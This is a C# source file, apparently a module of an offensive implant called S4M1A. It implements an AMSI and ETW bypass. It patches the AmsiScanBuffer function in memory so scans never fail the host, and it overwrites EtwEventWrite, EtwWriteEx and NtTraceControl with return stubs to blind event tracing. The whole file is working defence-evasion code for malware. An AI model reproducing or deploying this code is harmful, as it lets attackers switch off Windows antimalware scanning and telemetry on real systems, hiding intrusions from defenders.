using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;

namespace S4M1A.Implant.Evasion
{
    // =====================================================================
    //  S4M1A AmsiBypass v2.0
    //  Patches in-process memory (no file changes):
    //    - amsi.dll  AmsiScanBuffer : flips HRESULT operand
    //      (mov edx,0x80070057  ->  mov edx,0) => scans never fail the host
    //    - ntdll.dll EtwEventWrite / EtwWriteEx / NtTraceControl
    //      (xor eax,eax; ret) => ETW blind
    //  All patches are kept in memory and can be reverted with RestoreAll().
    //  NOTE: amsi.dll is usually loaded on demand by the CLR host; if the
    //  module is not yet present, Apply() simply returns (harmless).
    // =====================================================================

    public static class AmsiBypass
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool VirtualProtect(IntPtr lpAddress,
            UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        private const uint PAGE_EXECUTE_READWRITE = 0x40;
        private const uint PAGE_EXECUTE_READ = 0x20;

        private static readonly List<KeyValuePair<IntPtr, byte[]>> _original =
            new List<KeyValuePair<IntPtr, byte[]>>();

        public static bool Apply()
        {
            bool result = false;
            try { result |= PatchAmsiScanBuffer(); } catch { }
            try { result |= PatchNtdllEtw(); } catch { }
            return result;
        }

        // ------------------------- AMSI -------------------------

        private static bool PatchAmsiScanBuffer()
        {
            IntPtr h = GetModuleHandle("amsi.dll");
            if (h == IntPtr.Zero) return false;

            IntPtr entry = GetProcAddress(h, "AmsiScanBuffer");
            if (entry == IntPtr.Zero) return false;

            // classic x64 pattern:  mov edx, 0x80070057  (BA 57 00 07 80)
            // x86 prologue differs; the same operand appears shortly after
            // the entry in most Windows 10/11 builds.
            byte[] find = new byte[] { 0xBA, 0x57, 0x00, 0x07, 0x80 };
            byte[] repl = new byte[] { 0xBA, 0x00, 0x00, 0x00, 0x00 };

            int limit = 0x800; // search first 2 KB of the function
            for (int i = 0; i < limit; i++)
            {
                if (ReadByte(entry, i) == find[0] &&
                    ReadByte(entry, i + 1) == find[1] &&
                    ReadByte(entry, i + 2) == find[2] &&
                    ReadByte(entry, i + 3) == find[3] &&
                    ReadByte(entry, i + 4) == find[4])
                {
                    Patch(entry + i, repl);
                    return true;
                }
            }
            return false;
        }

        // ------------------------- ETW -------------------------

        private static bool PatchNtdllEtw()
        {
            IntPtr h = GetModuleHandle("ntdll.dll");
            if (h == IntPtr.Zero) return false;

            byte[] nullStub = IntPtr.Size == 8
                ? new byte[] { 0x48, 0x33, 0xC0, 0xC3 }   // xor rax,rax; ret
                : new byte[] { 0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3 }; // mov eax,0; ret

            bool ok = false;
            string[] targets = { "EtwEventWrite", "EtwWriteEx", "NtTraceControl" };
            foreach (string name in targets)
            {
                IntPtr fn = GetProcAddress(h, name);
                if (fn == IntPtr.Zero) continue;
                Patch(fn, nullStub);
                ok = true;
            }
            return ok;
        }

        // ------------------------- primitives -------------------------

        private static byte ReadByte(IntPtr addr, int offset)
        {
            return Marshal.ReadByte(addr, offset);
        }

        private static void Patch(IntPtr addr, byte[] data)
        {
            _original.Add(new KeyValuePair<IntPtr, byte[]>(addr, ReadBytes(addr, data.Length)));

            uint oldProtect;
            if (!VirtualProtect(addr, (UIntPtr)data.Length, PAGE_EXECUTE_READWRITE, out oldProtect))
                return;

            Marshal.Copy(data, 0, addr, data.Length);
            VirtualProtect(addr, (UIntPtr)data.Length,
                (oldProtect == 0) ? PAGE_EXECUTE_READ : oldProtect, out oldProtect);
        }

        private static byte[] ReadBytes(IntPtr addr, int count)
        {
            byte[] b = new byte[count];
            Marshal.Copy(addr, b, 0, count);
            return b;
        }

        public static void RestoreAll()
        {
            foreach (KeyValuePair<IntPtr, byte[]> kv in _original)
            {
                try
                {
                    Marshal.Copy(kv.Value, 0, kv.Key, kv.Value.Length);
                }
                catch { }
            }
            _original.Clear();
        }
    }
}